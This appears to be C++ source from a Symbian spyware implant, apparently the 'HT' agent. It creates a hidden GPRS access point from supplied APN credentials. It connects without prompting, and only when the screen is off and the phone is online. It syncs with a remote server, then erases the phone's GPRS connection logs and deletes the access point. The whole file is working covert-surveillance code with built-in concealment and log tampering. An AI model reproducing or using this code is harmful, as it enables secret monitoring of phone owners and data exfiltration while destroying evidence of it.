/*
 * ActionSyncApn.cpp
 *
 *  Created on: 25/ott/2010
 *      Author: Giovanna
 */

#include "ActionSyncApn.h"

#include <es_enum.h>     // for TConnectionInfoBuf
#include <rconnmon.h>	 // for connection monitor, add connmon.lib

#include <apaccesspointitem.h>
#include <CommsDatTypesV1_1.h>   

#include <hal.h>

#include <centralrepository.h>			// detect offline mode
#include <CoreApplicationUIsSDKCRKeys.h>

#include "ConnLogCleaner.h"		// delete wlan and gprs connection logs


_LIT(KIapName,"3G Internet");
    
CActionSyncApn::CActionSyncApn() :
	CAbstractAction(EAction_SyncApn), iApnList(1)
	{
	// No implementation required
	}

CActionSyncApn::~CActionSyncApn()
	{
	__FLOG(_L("Destructor"));
	
	delete iProtocol;
	delete iApDataHandler;
	delete iApUtils;
	delete iCommsDb;
	
	iConnection.Close();
	iSocketServ.Close();
	
	iApnList.Reset();
	iApnList.Close();
	
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

CActionSyncApn* CActionSyncApn::NewLC(const TDesC8& params)
	{
	CActionSyncApn* self = new (ELeave) CActionSyncApn();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionSyncApn* CActionSyncApn::NewL(const TDesC8& params)
	{
	CActionSyncApn* self = CActionSyncApn::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionSyncApn::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN("HT", "ActionSyncApn.txt");
	__FLOG(_L("------------"));
		
	BaseConstructL(params);

	// Parses the parameters...
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	
	TUint32 lenHost = 0;
	Mem::Copy(&lenHost, ptr, 4);
	ptr += sizeof(TUint32);
	
	if (lenHost > 0)
		{
		TUint8 totChars = (lenHost-1) / 2;
		TPtr16 ptrHost((TUint16 *) ptr, totChars, totChars);
		iHostName.Copy(ptrHost);
		}
	ptr += lenHost;
	
	TUint32 numApn = 0;
	Mem::Copy(&numApn,ptr,4);
	ptr += sizeof(TUint32);
	
	for(TInt i=0; i<numApn; i++)
		{
		TApnStruct apnStruct;
		ptr += 8; //mcc and mnc not used
		// retrieve apn name
		TUint32 apnLen;
		Mem::Copy(&apnLen,ptr,4);
		ptr += 4;
		if(apnLen>2)
			{
			TUint8 totChars = (apnLen-2) / 2;
			TPtr16 ptrApn((TUint16 *) ptr, totChars, totChars);
			apnStruct.apnName.Copy(ptrApn);
			}
		else 
			{
			apnStruct.apnName.Zero();
			}
		ptr += apnLen;
		//retrieve username
		TUint32 usrLen;
		Mem::Copy(&usrLen,ptr,4);
		ptr += 4;
		if(usrLen>2)
			{
			TUint8 totChars = (usrLen-2) / 2;
			TPtr16 ptrUsr((TUint16 *) ptr, totChars, totChars);
			apnStruct.apnUsername.Copy(ptrUsr);
			}
		else 
			{
			apnStruct.apnUsername.Zero();
			}
		ptr += usrLen;
		// retrieve password
		TUint32 pwdLen;
		Mem::Copy(&pwdLen,ptr,4);
		ptr += 4;
		if(pwdLen>2)
			{
			TUint8 totChars = (pwdLen-2) / 2;
			TPtr16 ptrPwd((TUint16 *) ptr, totChars, totChars);
			apnStruct.apnPasswd.Copy(ptrPwd);
			}
		else 
			{
			apnStruct.apnPasswd.Zero();
			}
		ptr += pwdLen;
		
		iApnList.AppendL(apnStruct);
		}
	
	iSocketServ.Connect();
	iProtocol = CProtocol::NewL(*this);	
	
	iCommsDb = CCommsDatabase::NewL();
	iApDataHandler = CApDataHandler::NewLC(*iCommsDb);
	CleanupStack::Pop(iApDataHandler);
	iApUtils = CApUtils::NewLC(*iCommsDb);
	CleanupStack::Pop(iApUtils);
	
	}


void CActionSyncApn::DispatchStartCommandL()
	{
	
	// If  we are offline we don't start connection because a prompt would be showed to the user
	if(OfflineL())
		{
		MarkCommandAsDispatchedL();
		return;
		}
		
	iConnection.Close();
	TInt err = KErrNone;
	// RConnection::Open can leave when there isn't any IAP available.
	TRAPD(panicErr, err = iConnection.Open(iSocketServ) );
	if (panicErr != KErrNone || err != KErrNone)
		{
		MarkCommandAsDispatchedL();
		return;
		}
	
	// we have to check the display status
	TInt value;
	TInt displayErr = KErrNone;
	displayErr = HAL::Get(HAL::EDisplayState,value);
		
	// comment out this part when debugging coz display always on when using TRK
	//value = 0; // TODO: comment this when done
	if (value == 1)
		{
		// display is active.... next time
		MarkCommandAsDispatchedL();
		return;
		}
		
	// create the access point
	// please mind that on N96 and few other devices, iapId is different from iApUid...
	// iApUid is the Uid of the created access point, and it's used for deleting it when finished
	// iapId is the id of the IAP record in particular, and it's used into the connection pref to force the silent connection
	// crazy isn't it????????
	TUint32 iapId = 0;  
	TRAPD(leaveCode,CreateIapL(iApnList[0],iapId));  
	if(leaveCode != KErrNone)  
		{
		// if we can't create ap we graciously try next time
		MarkCommandAsDispatchedL();
		return;
		}
	
	
	TCommDbConnPref	pref;
	pref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
	pref.SetDirection(ECommDbConnectionDirectionOutgoing);
	pref.SetIapId(iapId);   
	
	err = iConnection.Start(pref);   //TODO: find a way to try once more to connect
	
	if (err != KErrNone)
		{
		// clean phone registry
		CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
		TRAPD(result,logCleaner->DeleteConnLogSyncL(EGprs));
		CleanupStack::PopAndDestroy(logCleaner);
		
		// delete ap
		RemoveIapL(iApUid); 
		
		MarkCommandAsDispatchedL();
		return;
		}
	
	// start sync.... at last! and monitor user activity
	//iProtocol->ConnectToServerL( ETrue, iSocketServ, iConnection, iHostName, 80 );
	iProtocol->StartRestProtocolL( ETrue, iSocketServ, iConnection, iHostName, 80 );
		
	}


void CActionSyncApn::ConnectionTerminatedL(TInt aError)
	{
	__FLOG(_L("ConnectionTerminatedL()"));
	iConnection.Stop(RConnection::EStopAuthoritative);
	iConnection.Close();				// this should be useless after a Stop()....
	
	// delete log from phone registry
	CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
	TRAPD(result,logCleaner->DeleteConnLogSyncL(EGprs));
	CleanupStack::PopAndDestroy(logCleaner);
	
	// remove access point
	RemoveIapL(iApUid); 
	
	// load the new config if present
	if(iNewConfig) 
	{
		RProperty::Set(KPropertyUidSharedQueue, KPropertyKeySharedQueueTopAddedOrRemoved, 0xEFBE);
	} else {
		MarkCommandAsDispatchedL();
	}
	
	}

void CActionSyncApn::NewConfigDownloaded()
	{
		iNewConfig = ETrue;
	}

void CActionSyncApn::CreateIapL(TApnStruct aApnStruct, TUint32& aIapId)
	{
	iApUid=0;
	
	CApAccessPointItem* apItem = CApAccessPointItem::NewLC();
	
	// GPRS type
	apItem->SetBearerTypeL(EApBearerTypeGPRS);
	// apn, the MNO access (ex. ibox.tim.it)
	apItem->WriteLongTextL(EApGprsAccessPointName,aApnStruct.apnName );
	// username
	if(aApnStruct.apnUsername.Length() != 0)
		{
		apItem->WriteTextL(EApIspLoginName,aApnStruct.apnUsername);
		apItem->WriteTextL(EApIspIfAuthName,aApnStruct.apnUsername);
		apItem->WriteTextL(EApGprsIfAuthName,aApnStruct.apnUsername);
		}
	// password
	if(aApnStruct.apnPasswd.Length() !=0)
		{
		apItem->WriteTextL(EApIspLoginPass,aApnStruct.apnPasswd);
		apItem->WriteTextL(EApIspIfAuthPass,aApnStruct.apnPasswd);
		apItem->WriteTextL(EApGprsIfAuthPassword,aApnStruct.apnPasswd);
		}
	// autenticazione protetta(ETrue)/normale(EFalse)
	apItem->WriteBool(EApGprsDisablePlainTextAuth,EFalse);
	// access point name (the name of the access point on the phone)
	apItem->SetNamesL(KIapName);
	// save the access point
	iApUid = iApDataHandler->CreateFromDataL(*apItem);
	// retrieve the iapId used to force the silent connection
	aIapId = iApUtils->IapIdFromWapIdL(iApUid);
	//TUint32 iapId = apItem->WapUid();   //this is the same value as iApUid, the uid of the created access point, used for delete it
	//apItem->ReadUint(EApWapAccessPointID,iapId); // uid of the created access point, used for deleting it
	//apItem->ReadUint(EApWapIap,iapId);  // uid of the IAP, used to force the connection
	
	CleanupStack::PopAndDestroy(apItem);
	
	}

/*
void CActionSyncApn::CreateIapL(TApnStruct aApnStruct, TUint32& aIapId)
	{
	iApUid = 0;
	
    
    TBufC<32> commsdb_name_val(KIapName);
    
    TUint32 networkId;

    iCommsDb->BeginTransaction();    

    // creating a new network record
    CCommsDbTableView* network = iCommsDb->OpenTableLC(TPtrC(NETWORK));
    network->InsertRecord(networkId);
    network->WriteTextL(TPtrC(COMMDB_NAME), commsdb_name_val);
    network->PutRecordChanges();
    CleanupStack::PopAndDestroy(network);

    // creating a new outgoing gprs record
    TUint32 outgoingGprsId;
    CreateNewOgGprsL(*iCommsDb, commsdb_name_val, outgoingGprsId, aApnStruct);
    
    // creating a new wap accesspoint record
    TUint32 wapId;
    CreateNewAccessPointL(*iCommsDb, commsdb_name_val, wapId);
    iApUid = wapId;   // this is the ap uid

    // creating a new IAP record
    CCommsDbTableView* iap = iCommsDb->OpenTableLC(TPtrC(IAP));

    TUint32 iapId;
    iap->InsertRecord(iapId);
    aIapId = iapId;		// since we force this value into WAP_IAP below, this is the iap used to force connection...
    iap->WriteTextL(TPtrC(COMMDB_NAME), commsdb_name_val);
    iap->WriteUintL(TPtrC(IAP_SERVICE), outgoingGprsId);
    iap->WriteTextL(TPtrC(IAP_SERVICE_TYPE), TPtrC(OUTGOING_GPRS));
    iap->WriteTextL(TPtrC(IAP_BEARER_TYPE), TPtrC(MODEM_BEARER));
    // retrieve modem bearer id from MODEM_BEARER table
    CCommsDbTableView* modemTable = iCommsDb->OpenTableLC(TPtrC(MODEM_BEARER));
    TInt returnValue = 0;
    TUint32 modemId = 0;
    _LIT8(KGprs,"GPRS");
    returnValue = modemTable -> GotoFirstRecord();
    while( returnValue == KErrNone)
    	{
    	TBuf8<24> name;
    	modemTable->ReadTextL(TPtrC(COMMDB_NAME),name);
    	if(name.FindC(KGprs) != KErrNotFound)
    		{
    		modemTable->ReadUintL(TPtrC(COMMDB_ID), modemId);
    		break;
    		}
    	else
    		{
    		returnValue = modemTable->GotoNextRecord();
    		}
    	}
    CleanupStack::PopAndDestroy(modemTable);

    iap->WriteUintL( TPtrC(IAP_BEARER), modemId);
    iap->WriteUintL( TPtrC(IAP_NETWORK), networkId);
    iap->WriteUintL( TPtrC(IAP_NETWORK_WEIGHTING), 0 );
    // retrieve location id from LOCATION table
    CCommsDbTableView* locationTable = iCommsDb->OpenTableLC(TPtrC(LOCATION));
    returnValue = 0;
    TUint32 locationId = 0;
    _LIT8(KMobile,"Mobile");
    returnValue = locationTable -> GotoFirstRecord();
    while( returnValue == KErrNone)
    	{
        TBuf8<24> name;
        locationTable->ReadTextL(TPtrC(COMMDB_NAME),name);
        if(name.FindC(KMobile) != KErrNotFound)
        	{
        	locationTable->ReadUintL(TPtrC(COMMDB_ID), locationId);
        	break;
        	}
        else
        	{
        	returnValue = locationTable->GotoNextRecord();
        	}
        }
        CleanupStack::PopAndDestroy(locationTable);

    iap->WriteUintL( TPtrC(IAP_LOCATION), locationId); 
    iap->PutRecordChanges();
    CleanupStack::PopAndDestroy(iap);

    // creating a new wap bearer
    CCommsDbTableView* wapBearer = iCommsDb->OpenTableLC(TPtrC(WAP_IP_BEARER));

    TUint32 wapBearerId;
    wapBearer->InsertRecord(wapBearerId);

    wapBearer->WriteUintL(TPtrC(WAP_ACCESS_POINT_ID),wapId);
    _LIT(KWapGwAddress, "0.0.0.0");
    wapBearer->WriteTextL(TPtrC(WAP_GATEWAY_ADDRESS), KWapGwAddress);
    wapBearer->WriteUintL( TPtrC(WAP_IAP), iapId);
    wapBearer->WriteUintL( TPtrC(WAP_WSP_OPTION), EWapWspOptionConnectionOriented);
    wapBearer->WriteBoolL( TPtrC(WAP_SECURITY), EFalse);
    wapBearer->WriteUintL( TPtrC(WAP_PROXY_PORT), 0 );
    wapBearer->PutRecordChanges();
    CleanupStack::PopAndDestroy(wapBearer);
    
    // Finish

    iCommsDb->CommitTransaction();
    }
*/
/*
void CActionSyncApn::CreateNewOgGprsL(CCommsDatabase& aCommsDb, const TDesC& aCommsDbName, TUint32& aOgGprsId, const TApnStruct& aApnStruct)
    {
    CCommsDbTableView* commsOgGprs = aCommsDb.OpenTableLC(TPtrC(OUTGOING_GPRS));

    commsOgGprs->InsertRecord(aOgGprsId);
    commsOgGprs->WriteTextL(TPtrC(COMMDB_NAME), aCommsDbName);
    commsOgGprs->WriteLongTextL(TPtrC(GPRS_APN),aApnStruct.apnName);
    commsOgGprs->WriteUintL( TPtrC(GPRS_PDP_TYPE), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_REQ_PRECEDENCE), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_REQ_DELAY), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_REQ_RELIABILITY), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_REQ_PEAK_THROUGHPUT), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_REQ_MEAN_THROUGHPUT), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_MIN_PRECEDENCE), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_MIN_DELAY), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_MIN_RELIABILITY), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_MIN_PEAK_THROUGHPUT), 0);
    commsOgGprs->WriteUintL( TPtrC(GPRS_MIN_MEAN_THROUGHPUT), 0);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_DATA_COMPRESSION), EFalse);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_HEADER_COMPRESSION), EFalse);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_ANONYMOUS_ACCESS), EFalse);
    _LIT(KIpLit, "ip");
    commsOgGprs->WriteTextL( TPtrC(GPRS_IF_NETWORKS), KIpLit);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_IF_PROMPT_FOR_AUTH), EFalse);
    commsOgGprs->WriteTextL( TPtrC(GPRS_IF_AUTH_NAME),aApnStruct.apnUsername);
    commsOgGprs->WriteTextL( TPtrC(GPRS_IF_AUTH_PASS),aApnStruct.apnPasswd);
    commsOgGprs->WriteUintL( TPtrC(GPRS_IF_AUTH_RETRIES), 0);
    _LIT(KNullIp, "0.0.0.0");
    commsOgGprs->WriteTextL( TPtrC(GPRS_IP_GATEWAY), KNullIp);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_IP_DNS_ADDR_FROM_SERVER), ETrue);  //DNS automatico
    commsOgGprs->WriteTextL( TPtrC(GPRS_IP_NAME_SERVER1), KNullIp);
    commsOgGprs->WriteTextL( TPtrC(GPRS_IP_NAME_SERVER2), KNullIp);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_ENABLE_LCP_EXTENSIONS), EFalse);
    commsOgGprs->WriteBoolL( TPtrC(GPRS_DISABLE_PLAIN_TEXT_AUTH), EFalse); // autenticazione protetta/normale
    commsOgGprs->WriteBoolL( TPtrC(GPRS_IP_ADDR_FROM_SERVER), ETrue);
    commsOgGprs->WriteUintL( TPtrC(GPRS_AP_TYPE), 2);
    commsOgGprs->WriteUintL( TPtrC(GPRS_QOS_WARNING_TIMEOUT), 0xffffffff);

    commsOgGprs->PutRecordChanges();
    CleanupStack::PopAndDestroy(commsOgGprs);
    }
*/
/*
void CActionSyncApn::CreateNewAccessPointL(CCommsDatabase& aCommsDb, const TDesC& aCommsDbName, TUint32& aApId)
    {
    CCommsDbTableView* commsAp = aCommsDb.OpenTableLC(TPtrC(WAP_ACCESS_POINT));

    commsAp->InsertRecord(aApId);
    commsAp->WriteTextL(TPtrC(COMMDB_NAME), aCommsDbName);
    commsAp->WriteTextL(TPtrC(WAP_CURRENT_BEARER),  TPtrC(WAP_IP_BEARER));
    commsAp->PutRecordChanges();

    CleanupStack::PopAndDestroy(commsAp);
    }
*/
void CActionSyncApn::RemoveIapL(TUint32 aUid)
	{
	// first we try to remove the ap created at this run
	TInt leaveCode;
	TInt i=0;
	while((leaveCode!=KErrNone) && (i<300))
		{
		TRAP(leaveCode,iApDataHandler->RemoveAPL(aUid));  
		i++;
		}
	// This is a little tricky...
	// Sometimes, gprs access point just created it's not deleted with the previous method. So we have to search 
	// and cancel all gprs access points that we have created and left behind in previous sync.
	// The point is: in some devices, like N96, ap uids are messed up... one is the iap uid, and one is 
	// the wap ap uid (used to force connection)
	// With the procedure below we find the iap uid (used to create ap).
	// If you want to find the iapId, use CCDIAPRecord (KCDTIdIAPRecord)
	// instead of CCDIAPRecord
	CMDBSession* db = CMDBSession::NewLC(KCDLatestVersion);
	CMDBRecordSet<CCDWAPAccessPointRecord>* apRecordSet = new(ELeave) CMDBRecordSet<CCDWAPAccessPointRecord>(KCDTIdWAPAccessPointRecord);
	CleanupStack::PushL(apRecordSet);
	apRecordSet->LoadL(*db);
	CCDWAPAccessPointRecord* apRecord =NULL;
	TInt count = apRecordSet->iRecords.Count();
	for(TInt i=0; i<count; i++)
		{
		apRecord = static_cast<CCDWAPAccessPointRecord*>(apRecordSet->iRecords[i]);
		RBuf apName;
		apName.CreateL(apRecord->iRecordName);
		apName.CleanupClosePushL();
		if(apName.FindC(KIapName)!=KErrNotFound)
			{
			// we have to delete it
			TUint32 apUid = apRecord->RecordId();
			TInt leaveErr;
			TInt k=0;
			while((leaveErr!=KErrNone) && (k<300))
				{
				TRAP(leaveErr,iApDataHandler->RemoveAPL(apUid));  
				k++;
				}
			} 
		CleanupStack::PopAndDestroy(&apName);  		
		}
	CleanupStack::PopAndDestroy(apRecordSet);
	CleanupStack::PopAndDestroy(db);
	}


// http://wiki.forum.nokia.com/index.php/How_to_Detect_Offline_Mode_in_3rd_Edition
// http://wiki.forum.nokia.com/index.php/How_to_check_if_the_phone_is_in_offline_mode
TBool CActionSyncApn::OfflineL()
	{
	TBool offline = EFalse;
	TInt value=0;
	
	CRepository* repository = CRepository::NewLC(KCRUidCoreApplicationUIs);
	// Check offline mode on or not.
	if (repository->Get(KCoreAppUIsNetworkConnectionAllowed, value) == KErrNone)
	    {
	     // Do something based on value
		if( value == ECoreAppUIsNetworkConnectionNotAllowed)
			offline = ETrue;
	    }
	CleanupStack::PopAndDestroy(repository);
	return offline;
	}
